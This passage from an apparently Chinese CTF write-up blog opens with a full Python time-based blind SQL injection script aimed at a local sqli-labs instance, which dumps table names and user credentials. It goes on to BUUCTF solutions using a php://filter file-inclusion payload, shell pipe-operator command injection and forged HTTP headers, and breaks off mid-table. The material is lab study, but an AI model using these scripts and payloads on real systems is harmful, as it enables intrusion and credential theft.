class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">from</span> urllib <span class="keyword">import</span> request</span><br><span class="line"><span class="keyword">from</span> urllib <span class="keyword">import</span> parse</span><br><span class="line"><span class="keyword">from</span> time <span class="keyword">import</span>  time</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://127.0.0.1/sqli-labs-master/Less-9/?id=1&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#1 查数据库</span></span><br><span class="line">database_length = <span class="number">0</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    param = <span class="string">&quot;1&#x27; and if(length(database())=&quot;</span>+<span class="built_in">str</span>(database_length)+<span class="string">&quot;,sleep(0.1),1) #&quot;</span></span><br><span class="line">    t = time()</span><br><span class="line">    response = request.urlopen(url + parse.quote(param))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ( time() - t &gt; <span class="number">0.1</span> ):</span><br><span class="line">        print(<span class="string">&quot;DATABASE_LENGTH:&quot;</span>+<span class="built_in">str</span>(database_length))</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        database_length += <span class="number">1</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">db_name = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> l <span class="keyword">in</span> <span class="built_in">range</span>(database_length):</span><br><span class="line">    <span class="keyword">for</span> a <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">128</span>):</span><br><span class="line"></span><br><span class="line">        param = <span class="string">&quot;1&#x27; and if(ascii(substr(database(),&quot;</span>  +  <span class="built_in">str</span>(l+<span class="number">1</span>) +  <span class="string">&quot;))=&quot;</span>  +  <span class="built_in">str</span>(a) + <span class="string">&quot;,sleep(0.1),1) #&quot;</span></span><br><span class="line">        t = time()</span><br><span class="line">        response = request.urlopen(url + parse.quote(param))</span><br><span class="line">    </span><br><span class="line">        <span class="keyword">if</span> (time()-t &gt;<span class="number">0.1</span>):</span><br><span class="line">            db_name += <span class="built_in">chr</span>(a)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">print(<span class="string">&quot;[*]:&quot;</span>+db_name)</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">#尝试二分法扫描</span></span><br><span class="line"><span class="string">db_name = &quot;&quot;</span></span><br><span class="line"><span class="string">for l in range(database_length):</span></span><br><span class="line"><span class="string">    a,b = 64,64</span></span><br><span class="line"><span class="string">    while True:</span></span><br><span class="line"><span class="string">        b = int(b/2)</span></span><br><span class="line"><span class="string">        param = &quot;1&#x27; and ascii(substr(database(),&quot;  +  str(l+1) +  &quot;))&lt;&quot;  +  str(a) +  &quot;#&quot;</span></span><br><span class="line"><span class="string">        response = request.urlopen(url + parse.quote(param)).read().decode()</span></span><br><span class="line"><span class="string">        if (re.search(&quot;You are in&quot;,response)):</span></span><br><span class="line"><span class="string">            a -=b</span></span><br><span class="line"><span class="string">        else:</span></span><br><span class="line"><span class="string">            param = &quot;1&#x27; and ascii(substr(database(),&quot;+str(l+1)+&quot;)) =&quot;+str(a)+&quot; #&quot;</span></span><br><span class="line"><span class="string">            response = request.urlopen(url + parse.quote(param)).read().decode()</span></span><br><span class="line"><span class="string">            if (re.search(&quot;You are in&quot;,response)):</span></span><br><span class="line"><span class="string">                db_name += chr(a)</span></span><br><span class="line"><span class="string">                break</span></span><br><span class="line"><span class="string">            else:</span></span><br><span class="line"><span class="string">                a +=b</span></span><br><span class="line"><span class="string">print(&quot;db_name:&quot;+ db_name)</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#2 查表数量</span></span><br><span class="line">table_num = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    param = <span class="string">&quot;1 &#x27; and if((select count(*) from information_schema.tables where table_schema=database())=&quot;</span>+<span class="built_in">str</span>(table_num)+<span class="string">&quot;,sleep(0.1),1) #&quot;</span></span><br><span class="line">    t = time()</span><br><span class="line">    response = request.urlopen(url + parse.quote(param))</span><br><span class="line">    <span class="keyword">if</span> (time() - t &gt; <span class="number">0.1</span> ):</span><br><span class="line">        print(<span class="string">&quot;table_num:&quot;</span>+<span class="built_in">str</span>(table_num))</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        table_num += <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 查 表长度</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">ta_length</span>(<span class="params">num</span>):</span></span><br><span class="line">    table_length = <span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        param = <span class="string">&quot;1&#x27; and if(length(substr((select table_name from information_schema.tables where table_schema=database() limit &quot;</span>+<span class="built_in">str</span>(num)+<span class="string">&quot;,1),1))=&quot;</span>+<span class="built_in">str</span>(table_length)+<span class="string">&quot;,sleep(0.1),1) #&quot;</span></span><br><span class="line">        t = time()</span><br><span class="line">        response = request.urlopen(url + parse.quote(param))</span><br><span class="line">        <span class="keyword">if</span> (time() - t &gt; <span class="number">0.1</span> ):</span><br><span class="line">            <span class="keyword">return</span> table_length</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            table_length += <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 查表</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> n <span class="keyword">in</span> <span class="built_in">range</span>(table_num):</span><br><span class="line">    table_name =<span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> l  <span class="keyword">in</span> <span class="built_in">range</span>(ta_length(n)): <span class="comment"># 表的长度</span></span><br><span class="line">        <span class="keyword">for</span> a <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">128</span>): <span class="comment">#爆破表</span></span><br><span class="line">            param = <span class="string">&quot;1&#x27; and if(ascii(substr((select table_name from information_schema.tables where table_schema=database() limit &quot;</span>+<span class="built_in">str</span>(n)+<span class="string">&quot;,1),&quot;</span>+<span class="built_in">str</span>(l+<span class="number">1</span>)+<span class="string">&quot;,1)) =&quot;</span>+<span class="built_in">str</span>(a)+<span class="string">&quot;,sleep(0.1),1) #&quot;</span></span><br><span class="line">            t = time()</span><br><span class="line">            response = request.urlopen(url + parse.quote(param))</span><br><span class="line">            <span class="keyword">if</span> (time() - t &gt; <span class="number">0.1</span> ):</span><br><span class="line">                table_name += <span class="built_in">chr</span>(a)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">    print(<span class="string">&quot;table_name:&quot;</span> + table_name)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 3 查字段</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 查字段个数</span></span><br><span class="line"></span><br><span class="line">columns_num = <span class="number">0</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    param = <span class="string">&quot;1&#x27; and if((select count(*) from information_schema.columns where table_name=&#x27;users&#x27;)=&quot;</span>+<span class="built_in">str</span>(columns_num)+<span class="string">&quot;,sleep(0.1),1) #&quot;</span></span><br><span class="line">    t = time()</span><br><span class="line">    response = request.urlopen(url + parse.quote(param))</span><br><span class="line">    <span class="keyword">if</span> (time() - t &gt; <span class="number">0.1</span>):</span><br><span class="line">        print(<span class="string">&quot;columns_name:&quot;</span>+<span class="built_in">str</span>(columns_num))</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        columns_num += <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 查每个字段的长度</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">co_length</span>(<span class="params">num</span>):</span></span><br><span class="line">    columns_length = <span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        param = <span class="string">&quot;1&#x27; and if(length(substr((select column_name from information_schema.columns where table_name=&#x27;users&#x27; limit &quot;</span>+<span class="built_in">str</span>(num)+<span class="string">&quot;,1),1))=&quot;</span>+<span class="built_in">str</span>(columns_length)+<span class="string">&quot;,sleep(0.1),1) #&quot;</span></span><br><span class="line">        t = time()</span><br><span class="line">        response = request.urlopen(url + parse.quote(param))</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (time() - t &gt; <span class="number">0.1</span>):</span><br><span class="line">            <span class="keyword">return</span> columns_length</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            columns_length += <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 查每个字段的值</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> n <span class="keyword">in</span> <span class="built_in">range</span>(columns_num):</span><br><span class="line">    columns_name =<span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> l  <span class="keyword">in</span> <span class="built_in">range</span>(co_length(n)): <span class="comment"># 表的长度</span></span><br><span class="line">        <span class="keyword">for</span> a <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">128</span>): <span class="comment">#爆破表</span></span><br><span class="line">            param = <span class="string">&quot;1&#x27; and if(ascii(substr((select column_name from information_schema.columns where table_name=&#x27;users&#x27; limit &quot;</span>+<span class="built_in">str</span>(n)+<span class="string">&quot;,1),&quot;</span>+<span class="built_in">str</span>(l+<span class="number">1</span>)+<span class="string">&quot;,1)) =&quot;</span>+<span class="built_in">str</span>(a)+<span class="string">&quot;,sleep(0.1),1) #&quot;</span></span><br><span class="line">            t = time()</span><br><span class="line">            response = request.urlopen(url + parse.quote(param))</span><br><span class="line">            <span class="keyword">if</span> (time() - t &gt; <span class="number">0.1</span>):</span><br><span class="line">                columns_name += <span class="built_in">chr</span>(a)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">    print(<span class="string">&quot;table_name:&quot;</span> +columns_name)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 下载数据</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 查 username</span></span><br><span class="line"></span><br><span class="line">num = <span class="number">0</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    param = <span class="string">&quot;1&#x27; and if((select count(*) from users )= &quot;</span>+<span class="built_in">str</span>(num)+<span class="string">&quot;,sleep(0.1),1)#&quot;</span></span><br><span class="line">    t = time()</span><br><span class="line">    response = request.urlopen(url + parse.quote(param)).read().decode()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (time() - t &gt; <span class="number">0.1</span>):</span><br><span class="line">        print(<span class="string">&quot;num:&quot;</span>+<span class="built_in">str</span>(num))</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        num += <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">length</span>(<span class="params">num</span>):</span></span><br><span class="line">    user_length = <span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        param = <span class="string">&quot;1&#x27; and if(length(substr((select username from users limit &quot;</span>+<span class="built_in">str</span>(num)+<span class="string">&quot;,1),1))=&quot;</span>+<span class="built_in">str</span>(user_length)+<span class="string">&quot;,sleep(0.1),1) #&quot;</span></span><br><span class="line">        t = time()</span><br><span class="line">        response = request.urlopen(url + parse.quote(param)).read().decode()</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (time() - t &gt; <span class="number">0.1</span>):</span><br><span class="line">            print(user_length)</span><br><span class="line">            <span class="keyword">return</span> user_length</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            user_length += <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Name</span>(<span class="params">value1,value2</span>):</span></span><br><span class="line">    <span class="keyword">for</span> n <span class="keyword">in</span> <span class="built_in">range</span>(num):</span><br><span class="line">        columns_name1 = columns_name2 = <span class="string">&quot;&quot;</span></span><br><span class="line">        <span class="keyword">for</span> l  <span class="keyword">in</span> <span class="built_in">range</span>(length(n)): <span class="comment"># 表的长度</span></span><br><span class="line">            <span class="keyword">for</span> a <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">128</span>): <span class="comment">#爆破表</span></span><br><span class="line">                param = <span class="string">&quot;1&#x27; and if(ascii(substr((select &quot;</span>+value1+<span class="string">&quot; from users limit &quot;</span>+<span class="built_in">str</span>(n)+<span class="string">&quot;,1),&quot;</span>+<span class="built_in">str</span>(l+<span class="number">1</span>)+<span class="string">&quot;,1)) =&quot;</span>+<span class="built_in">str</span>(a)+<span class="string">&quot;,sleep(0.1),1) #&quot;</span></span><br><span class="line">                t = time()</span><br><span class="line">                response = request.urlopen(url + parse.quote(param))</span><br><span class="line">                <span class="keyword">if</span> (time() - t &gt; <span class="number">0.1</span> ):</span><br><span class="line">                    columns_name1 += <span class="built_in">chr</span>(a)</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">            <span class="keyword">for</span> a <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">128</span>): <span class="comment">#爆破表</span></span><br><span class="line">                param = <span class="string">&quot;1&#x27; and if(ascii(substr((select &quot;</span>+value2+<span class="string">&quot; from users limit &quot;</span>+<span class="built_in">str</span>(n)+<span class="string">&quot;,1),&quot;</span>+<span class="built_in">str</span>(l+<span class="number">1</span>)+<span class="string">&quot;,1)) =&quot;</span>+<span class="built_in">str</span>(a)+<span class="string">&quot;,sleep(0.1),1) #&quot;</span></span><br><span class="line">                t = time()</span><br><span class="line">                response = request.urlopen(url + parse.quote(param))</span><br><span class="line">                <span class="keyword">if</span> (time() - t &gt; <span class="number">0.1</span> ):</span><br><span class="line">                    columns_name2 += <span class="built_in">chr</span>(a)</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">        print(columns_name1+<span class="string">&quot;:&quot;</span>+columns_name2)</span><br><span class="line"></span><br><span class="line">Name(<span class="string">&quot;username&quot;</span>,<span class="string">&quot;password&quot;</span>)</span><br></pre></td></tr></table></figure><hr><h1 id="less-10"><a href="#less-10" class="headerlink" title="less-10"></a>less-10</h1><p>由题目和源代码可知这还是一个延时盲注，只不过这是由双引号闭合了。</p><p><img src="/2021/02/17/sql-libs-wp/43.png"></p><p>后续操作与less-9相同。</p></div><footer class="post-footer"><div class="post-eof"></div></footer></article><article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en"><link itemprop="mainEntityOfPage" href="http://example.com/2021/01/16/BUUctf-wp/"><span hidden itemprop="author" itemscope itemtype="http://schema.org/Person"><meta itemprop="image" content="/images/avatar.gif"><meta itemprop="name" content="John Doe"><meta itemprop="description" content=""></span><span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization"><meta itemprop="name" content="Hexo"></span><header class="post-header"><h2 class="post-title" itemprop="name headline"><a href="/2021/01/16/BUUctf-wp/" class="post-title-link" itemprop="url">BUUctf-wp</a></h2><div class="post-meta"><span class="post-meta-item"><span class="post-meta-item-icon"><i class="far fa-calendar"></i> </span><span class="post-meta-item-text">Posted on</span> <time title="Created: 2021-01-16 19:00:48" itemprop="dateCreated datePublished" datetime="2021-01-16T19:00:48+08:00">2021-01-16</time> </span><span class="post-meta-item"><span class="post-meta-item-icon"><i class="far fa-calendar-check"></i> </span><span class="post-meta-item-text">Edited on</span> <time title="Modified: 2021-03-02 18:01:15" itemprop="dateModified" datetime="2021-03-02T18:01:15+08:00">2021-03-02</time></span></div></header><div class="post-body" itemprop="articleBody"><h2 id="一、Secret-File"><a href="#一、Secret-File" class="headerlink" title="一、Secret File"></a>一、Secret File</h2><h3 id="1、解题"><a href="#1、解题" class="headerlink" title="1、解题"></a>1、解题</h3><p>打开页面无任何提示，首先查看网页源代码。</p><p><img src="/2021/01/16/BUUctf-wp/1.png"></p><p><img src="/2021/01/16/BUUctf-wp/2.png" alt="网页源代码"></p><p>发现有个Archive_room.php，接着点击查看</p><p><img src="/2021/01/16/BUUctf-wp/4.png"></p><p>查看源代码</p><p><img src="/2021/01/16/BUUctf-wp/7.png"></p><p>发现有个action.php文件，继续点击</p><p><img src="/2021/01/16/BUUctf-wp/5.png"></p><p>但这个页面是end.php，直接跳过了action.php。</p><p>查看源码也是没有出现有关flag的内容。</p><p><img src="/2021/01/16/BUUctf-wp/3.png"></p><p>试着抓包，访问action.php。结果出现个 secr3t.php 。</p><p><img src="/2021/01/16/BUUctf-wp/6.png"></p><p>接着访问</p><p><img src="/2021/01/16/BUUctf-wp/8.png"></p><p>源代码为：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>); </span><br><span class="line">error_reporting(<span class="number">0</span>);  </span><br><span class="line"><span class="variable">$file</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];<span class="comment">//变量file=用get传参传的值</span></span><br><span class="line"><span class="keyword">if</span>(strstr(<span class="variable">$file</span>,<span class="string">&quot;../&quot;</span>)||stristr(<span class="variable">$file</span>,<span class="string">&quot;tp&quot;</span>)||stristr(<span class="variable">$file</span>,<span class="string">&quot;input&quot;</span>)||stristr(<span class="variable">$file</span>,<span class="string">&quot;data&quot;</span>))strstr(str1,str2) <span class="comment">//strstr函数用于判断字符串str2是否是str1的子串。这里过滤了../、tp、input、data</span></span><br><span class="line">&#123;    </span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;Oh no!&quot;</span>;    </span><br><span class="line">    <span class="keyword">exit</span>();  </span><br><span class="line">&#125;  </span><br><span class="line"><span class="keyword">include</span>(<span class="variable">$file</span>); <span class="comment">//flag放在了flag.php里</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>该题很明显是文件包含，而且没有过滤伪协议，可以试着用php伪协议</p><p>payload：<code>?file=php://filter/read=convert.base64-encode/resource=flag.php</code></p><p><img src="/2021/01/16/BUUctf-wp/9.png"></p><p>base64解码后得到flag</p><p><img src="/2021/01/16/BUUctf-wp/10.png"></p><h3 id="2、学习笔记"><a href="#2、学习笔记" class="headerlink" title="2、学习笔记"></a>2、学习笔记</h3><h4 id="PHP-strstr-函数"><a href="#PHP-strstr-函数" class="headerlink" title="PHP strstr() 函数"></a><strong>PHP strstr() 函数</strong></h4><h5 id="（1）定义和用法"><a href="#（1）定义和用法" class="headerlink" title="（1）定义和用法"></a>（1）定义和用法</h5><p>strstr() 函数搜索字符串在另一字符串中是否存在，如果是，返回该字符串及剩余部分，否则返回 FALSE。</p><p><strong>注释：</strong>该函数是二进制安全的。</p><p><strong>注释：</strong>该函数是区分大小写的。如需进行不区分大小写的搜索，则使用 <a target="_blank" rel="noopener" href="https://www.runoob.com/php/func-string-stristr.html">stristr()</a> 函数。</p><h5 id="（2）语法"><a href="#（2）语法" class="headerlink" title="（2）语法"></a>（2）语法</h5><p>strstr(<em>string,search,before_search</em>)</p><table><thead><tr><th align="left">参数</th><th align="left">描述</th></tr></thead><tbody><tr><td align="left"><em>string</em></td><td align="left">必需。规定被搜索的字符串。</td></tr><tr><td align="left"><em>search</em></td><td align="left">必需。规定要搜索的字符串。如果该参数是数字，则搜索匹配该数字对应的 ASCII 值的字符。</td></tr><tr><td align="left"><em>before_search</em></td><td align="left">可选。一个默认值为 “false” 的布尔值。如果设置为 “true”，它将返回 <em>search</em> 参数第一次出现之前的字符串部分。</td></tr></tbody></table><p>例如：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> strstr(<span class="string">&quot;Hello world!&quot;</span>,<span class="number">111</span>);<span class="comment">//因为111是数字，则匹配ascll码为o</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>输出结果：</p><p><code>o world!</code></p><hr><h2 id="二、-ACTF2020-新生赛-Exec1"><a href="#二、-ACTF2020-新生赛-Exec1" class="headerlink" title="二、[ACTF2020 新生赛]Exec1"></a>二、[ACTF2020 新生赛]Exec1</h2><h3 id="1、解题-1"><a href="#1、解题-1" class="headerlink" title="1、解题"></a>1、解题</h3><p><img src="/2021/01/16/BUUctf-wp/11.png"></p><p>打开题目，源码没有什么提示，就用回环地址ping一下。</p><p><img src="/2021/01/16/BUUctf-wp/12.png"></p><p>结果ping成功了。首先用位管道符ls一下，查看目录。</p><p><img src="/2021/01/16/BUUctf-wp/13.png"></p><p>发现这是index.php，试着查看前一级目录。</p><p><img src="/2021/01/16/BUUctf-wp/14.png"></p><p>发现有个flag的文件，试着用cat查看文件。</p><p><img src="/2021/01/16/BUUctf-wp/15.png"></p><p>得到flag。</p><h3 id="2、学习笔记-1"><a href="#2、学习笔记-1" class="headerlink" title="2、学习笔记"></a>2、学习笔记</h3><h5 id="常见管道符"><a href="#常见管道符" class="headerlink" title="常见管道符"></a>常见管道符</h5><p>1、**<code>|</code>**（按位或），直接执行|后面的语句</p><p><img src="/2021/01/16/BUUctf-wp/16.png"></p><p>2、**<code>||</code>**（逻辑或），如果前面命令是错的那么就执行后面的语句，否则只执行前面的语句</p><p><img src="/2021/01/16/BUUctf-wp/18.png"></p><p>3、**<code>&amp;</code>**（按位与），<code>&amp;</code>前面和后面命令都要执行，无论前面真假</p><p><img src="/2021/01/16/BUUctf-wp/19.png"></p><p>4、**<code>&amp;&amp;</code>**（逻辑与），如果前面为假，后面的命令也不执行，如果前面为真则执行两条命令</p><p><img src="/2021/01/16/BUUctf-wp/20.png"></p><p>5、**<code>;</code>**（linux下有的，和&amp;一样的作用）</p><hr><h2 id="三、-BJDCTF-2nd-假猪套天下第一"><a href="#三、-BJDCTF-2nd-假猪套天下第一" class="headerlink" title="三、[BJDCTF 2nd]假猪套天下第一"></a>三、[BJDCTF 2nd]假猪套天下第一</h2><h3 id="1、解题-2"><a href="#1、解题-2" class="headerlink" title="1、解题"></a>1、解题</h3><p>打开题目是一个登录界面。</p><p><img src="/2021/01/16/BUUctf-wp/21.png"></p><p>试着随便登录一个用户名和密码（1&amp;1）。发现登录成功，但是却没什么有关flag的提示。</p><p><img src="/2021/01/16/BUUctf-wp/22.jpg"></p><p>即使查看index.php和登录后的profile.php的源代码也没有发现有关flag的提示，所以试着抓包,提示有个L0g1n.php。</p><p><img src="/2021/01/16/BUUctf-wp/1.jpg"></p><p>接着访问该php，出现新的提示。</p><p><img src="/2021/01/16/BUUctf-wp/2.jpg"></p><p>很明显这是伪造header头，所以按照提示将时间设置比99年多即可</p><p><img src="/2021/01/16/BUUctf-wp/3.jpg"></p><p>接着又说访问者的地址是localhost。查询后发现，绕过方法有添加X-forward-from或者Client-ip绕过。这里的第一种方法被过滤了，所以用第二种。</p><p><img src="/2021/01/16/BUUctf-wp/4.jpg"></p><p>提示需要从这个网站访问，这里添加一个Referer头绕过</p><p><img src="/2021/01/16/BUUctf-wp/5.jpg"></p><p>提示再次变更，告诉我们要通过Commodore 64浏览器进行访问。我们通过修改User-Agent来实现。</p><p><img src="/2021/01/16/BUUctf-wp/6.jpg"></p><p>提示这次说我们的邮箱是来自<a href="mailto:&#114;&#x6f;&#111;&#x74;&#x40;&#103;&#101;&#x6d;&#x2d;&#x6c;&#111;&#x76;&#101;&#46;&#x63;&#x6f;&#x6d;">&#114;&#x6f;&#111;&#x74;&#x40;&#103;&#101;&#x6d;&#x2d;&#x6c;&#111;&#x76;&#101;&#46;&#x63;&#x6f;&#x6d;</a>，通过修改From来实现</p><p><img src="/2021/01/16/BUUctf-wp/7.jpg"></p><p>接着使用提供的代理地址访问，添加Via。</p><p><img src="/2021/01/16/BUUctf-wp/8.jpg"></p><p>base64解码得到flag。</p><h3 id="2、学习笔记-2"><a href="#2、学习笔记-2" class="headerlink" title="2、学习笔记"></a>2、学习笔记</h3><p>此类题型就是套路：<br>burpsuite抓包，重放，并根据题目要求多次重放，最终满足全部要求后获得flag。</p><h4 id="Header请求头参数详解"><a href="#Header请求头参数详解" class="headerlink" title="Header请求头参数详解"></a>Header请求头参数详解</h4><table><thead><tr><th>Header</th><th>解释</th><th>示例</th></tr></thead><tbody><tr><td>Accept</td><td>指定客户端能够接收的内容类型</td><td>Accept: text/plain, text/html,application/json</td></tr><tr><td>Accept-Charset</td><td>浏览器可以接受的字符编码集。</td><td>Accept-Charset: iso-8859-5</td></tr><tr><td>Accept-Encoding</td><td>指定浏览器可以支持的web服务器返回内容压缩编码类型。</td><td>Accept-Encoding: compress, gzip</td></tr><tr><td>Accept-Language</td><td>浏览器可接受的语言</td><td>Accept-Language: en,zh</td></tr><tr><td>Accept-Ranges</td><td>可以请求网页实体的一个或者多个子范围字段</td><td>Accept-Ranges: bytes</td></tr><tr><td>Authorization</td><td>HTTP授权的授权证书</td><td>Authorization: Basic QWxhZGRpbjpvcGVuIHNlc2FtZQ==</td></tr><tr><td>Cache-Control</td><td>指定请求和响应遵循的缓存机制</td><td>Cache-Control: no-cache</td></tr><tr><td>Connection</td><td>表示是否需要持久连接。（HTTP 1.1默认进行持久连接）</td><td>Connection: close</td></tr><tr><td>Cookie</td><td>HTTP请求发送时，会把保存在该请求域名下的所有cookie值一起发送给web服务器。</td><td>Cookie: $Version=1; Skin=new;</td></tr><tr><td>Content-Length</td><td>请求的内容长度</td><td>Content-Length: 348</td></tr><tr><td>Content-Type</td><td>请求的与实体对应的MIME信息</td><td>Content-Type: application/x-www-form-urlencoded</td></tr><tr><td>Date</td><td>请求发送的日期和时间</td><td>Date: Tue, 15 Nov 2010 08:12:31 GMT</td></tr><tr><td>Expect</td><td>请求的特定的服务器行为</td><td>Expect: 100-continue</td></tr><tr><td>From</td><td>发出请求的用户的Email</td><td>From: <a href="mailto:&#117;&#115;&#101;&#x72;&#x40;&#x65;&#x6d;&#x61;&#x69;&#x6c;&#x2e;&#99;&#x6f;&#109;">&#117;&#115;&#101;&#x72;&#x40;&#x65;&#x6d;&#x61;&#x69;&#x6c;&#x2e;&#99;&#x6f;&#109;</a></td></tr><tr><td>Host</td><td>指定请求的服务器的域名和端口号</td><td>Host: <a target="_blank" rel="noopener" href="http://www.zcmhi.com/">www.zcmhi.com</a></td></tr><tr><td>If-Match</td><td>只有请求内容与实体相匹配才有效</td><td>If-Match: “737060cd8c284d8af7ad3082f209582d”</td></tr><tr><td>If-Modified-Since</td><td>如果请求的部分在指定时间之后被修改则请求成功，未被修改则返回304代码</td><td>If-Modified-Since: Sat, 29 Oct 2010 19:43:31 GMT</td></tr><tr><td>If-None-Match</td><td>如果内容未改变返回304代码，参数为服务器先前发送的Etag，与服务器回应的Etag比较判断是否改变</td><td>If-None-Match: “737060cd8c284d8af7ad3082f209582d”</td></tr><tr><td>If-Range</td><td>如果实体未改变，服务器发送客户端丢失的部分，否则发送整个实体。参数也为Etag</td><td>If-Range: “737060cd8c284d8af7ad3082f209582d”</td></tr><tr><td>If-Unmodified-Since</td><td>只在实体在指定时间之后未被修改才请求成功</td><td>If-Unmodified-Since: Sat, 29 Oct 2010 19:43:31 GMT</td></tr><tr><td>Max-Forwards</td><td>限制信息通过代理和网关传送的时间</td><td>Max-Forwards: 10</td></tr><tr><td>Pragma</td><td>用来包含实现特定的指令</td><td>Pragma: no-cache</td></tr><tr><td>Proxy-Authorization</td><td>连接到代理的授权证书</td><td>Proxy-Authorization: Basic QWxhZGRpbjpvcGVuIHNlc2FtZQ==</td></tr><tr><td>Range</td><td>只请求实体的一部分，指定范围</td><td>Range: bytes=500-999</td></tr><tr><td>Referer</td><td>先前网页的地址，当前请求网页紧随其后,即来路</td><td>Referer: <a target="_blank" rel="noopener" href="http://www.zcmhi.com/archives/71.html">http://www.zcmhi.com/archives…</a></td></tr><tr><td>TE</td><td>客户端愿意接受的传输编码，并通知服务器接受接受尾加头信息</td><td>TE: trailers,deflate;q=0.5</td></tr><tr><td>Upgrade</td><td>向服务器指定某种传输协议以便服务器进行转换（如果支持）</td><td>Upgrade: HTTP/2.0, SHTTP/1.3, IRC/6.9, 